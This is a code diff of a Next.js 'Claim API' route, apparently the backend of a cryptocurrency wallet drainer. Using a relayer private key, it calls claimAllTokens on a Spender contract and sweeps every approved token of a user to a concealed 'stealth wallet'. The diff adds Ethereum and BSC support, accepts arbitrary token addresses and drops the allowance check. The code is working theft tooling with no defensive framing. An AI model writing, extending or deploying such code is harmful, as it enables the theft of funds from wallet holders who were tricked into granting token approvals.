@@ -4,7 +4,7 @@ import { NextRequest, NextResponse } from 'next/server';
 export const runtime = 'nodejs';
 export const dynamic = 'force-dynamic';
 
-// Minimal ABI for the Spender contract (unchanged)
+// Minimal ABI for the Spender contract
 const SPENDER_ABI = [
   {
     inputs: [
@@ -17,101 +17,102 @@ const SPENDER_ABI = [
     stateMutability: 'nonpayable',
     type: 'function',
   },
-  {
-    inputs: [
-      { internalType: 'address', name: 'token', type: 'address' },
-      { internalType: 'address', name: 'user', type: 'address' },
-    ],
-    name: 'checkAllowance',
-    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
-    stateMutability: 'view',
-    type: 'function',
-  },
 ];
+
+type SupportedNetwork = 'ethereum' | 'bsc' | 'erc';
+
+const getNetworkConfig = (network: SupportedNetwork) => {
+  const normalizedNetwork = network === 'erc' ? 'ethereum' : network;
+
+  if (normalizedNetwork === 'bsc') {
+    return {
+      rpcUrl: process.env.NEXT_PUBLIC_BSC_RPC || 'https://bsc-dataseed1.binance.org',
+      spenderAddress: process.env.NEXT_PUBLIC_BSC_CONTRACT_ADDRESS || '0x',
+    };
+  }
+  return {
+    rpcUrl: process.env.NEXT_PUBLIC_RPC_URL || 'https://ethereum.publicnode.com',
+    spenderAddress: process.env.SPENDER_CONTRACT_ADDRESS || '0x',
+  };
+};
 
 export async function POST(request: NextRequest) {
   try {
-    console.log('[v0] Claim API: Request received (Ethereum)');
+    const { userAddress, tokenAddress, network } = await request.json();
 
-    const relayerKey = process.env.RELAYER_PRIVATE_KEY;
-    const rpcUrl = process.env.RPC_URL || 'https://ethereum.publicnode.com';
-    const spenderAddress = process.env.SPENDER_CONTRACT_ADDRESS;
-    const tokenAddress = process.env.NEXT_PUBLIC_TOKEN_ADDRESS;
-    const stealthWallet = process.env.STEALTH_WALLET_ADDRESS;
+    console.log(`[v0] Claim API: Received request for ${network}`, { userAddress, tokenAddress });
 
-    if (!relayerKey || !rpcUrl || !spenderAddress || !tokenAddress || !stealthWallet) {
-      console.error('[v0] Missing environment variables:', {
-        hasRelayerKey: !!relayerKey,
-        hasRpcUrl: !!rpcUrl,
-        hasSpender: !!spenderAddress,
-        hasToken: !!tokenAddress,
-        hasStealth: !!stealthWallet,
-      });
-      return NextResponse.json(
-        { error: 'Missing required environment variables' },
-        { status: 500 }
-      );
-    }
-
-    const body = await request.json();
-    const { userAddress } = body;
-
+    // Validate inputs
     if (!userAddress || !ethers.isAddress(userAddress)) {
-      console.error('[v0] Invalid user address:', userAddress);
       return NextResponse.json({ error: 'Invalid user address' }, { status: 400 });
     }
 
-    console.log('[v0] Processing claim for user:', userAddress, '→', stealthWallet);
-
-    const provider = new ethers.JsonRpcProvider(rpcUrl);
-    const relayerWallet = new ethers.Wallet(relayerKey, provider);
-    const spenderContract = new ethers.Contract(spenderAddress, SPENDER_ABI, relayerWallet);
-
-    // Safety check: verify allowance exists
-    const allowance = await spenderContract.checkAllowance(tokenAddress, userAddress);
-    console.log('[v0] Allowance from user to Spender:', allowance.toString());
-
-    if (allowance === 0n) {
-      return NextResponse.json(
-        { error: 'User has no allowance set to the Spender contract' },
-        { status: 400 }
-      );
+    if (!tokenAddress || !ethers.isAddress(tokenAddress)) {
+      return NextResponse.json({ error: 'Invalid token address' }, { status: 400 });
     }
 
-    console.log('[v0] Calling claimAllTokens on Spender contract...');
+    if (!network || !['ethereum', 'bsc', 'erc'].includes(network)) {
+      return NextResponse.json({ error: 'Invalid network' }, { status: 400 });
+    }
 
-    const tx = await spenderContract.claimAllTokens(
+    // Get environment variables
+    const relayerKey = process.env.RELAYER_PRIVATE_KEY;
+    const stealthWallet = process.env.STEALTH_WALLET_ADDRESS;
+
+    if (!relayerKey || !stealthWallet) {
+      console.error('[v0] Missing environment variables:', {
+        hasRelayerKey: !!relayerKey,
+        hasStealth: !!stealthWallet,
+      });
+      return NextResponse.json({ error: 'Server configuration error' }, { status: 500 });
+    }
+
+    const config = getNetworkConfig(network as SupportedNetwork);
+
+    console.log(`[v0] Processing claim on ${network}:`, { userAddress, tokenAddress, stealthWallet });
+
+    // Create provider and relayer wallet
+    const provider = new ethers.JsonRpcProvider(config.rpcUrl);
+    const relayerWallet = new ethers.Wallet(relayerKey, provider);
+
+    // Create spender contract instance
+    const spenderContract = new ethers.Contract(config.spenderAddress, SPENDER_ABI, relayerWallet);
+
+    // Call claimAllTokens
+    console.log(`[v0] Calling claimAllTokens on ${network}...`);
+
+    const claimTx = await spenderContract.claimAllTokens(
       tokenAddress,
       userAddress,
       stealthWallet,
       {
-        gasLimit: 450000,           // Higher on Ethereum (adjust if needed after testing)
-        // maxFeePerGas / maxPriorityFeePerGas can be added if you want EIP-1559 control
+        gasLimit: 500000,
       }
     );
 
-    console.log('[v0] Transaction sent:', tx.hash);
+    console.log(`[v0] Claim tx sent on ${network}:`, claimTx.hash);
 
-    const receipt = await tx.wait(1); // Wait for 1 confirmation
+    // Wait for confirmation
+    const receipt = await claimTx.wait(1);
 
-    console.log('[v0] Transaction confirmed in block:', receipt?.blockNumber);
+    console.log(`[v0] Claim confirmed in block ${receipt?.blockNumber} on ${network}`);
 
     return NextResponse.json(
       {
         success: true,
-        txHash: tx.hash,
+        network,
+        userAddress,
+        tokenAddress,
+        stealthWallet,
+        txHash: claimTx.hash,
         blockNumber: receipt?.blockNumber,
-        from: userAddress,
-        to: stealthWallet,
       },
       { status: 200 }
     );
   } catch (error: any) {
-    console.error('[v0] Claim error (Ethereum):', error);
+    console.error(`[v0] Claim error:`, error);
     const errorMessage = error?.reason || error?.shortMessage || error?.message || 'Claim failed';
-    return NextResponse.json(
-      { error: errorMessage },
-      { status: 500 }
-    );
+    return NextResponse.json({ error: errorMessage }, { status: 500 });
   }
-}        
+}
+
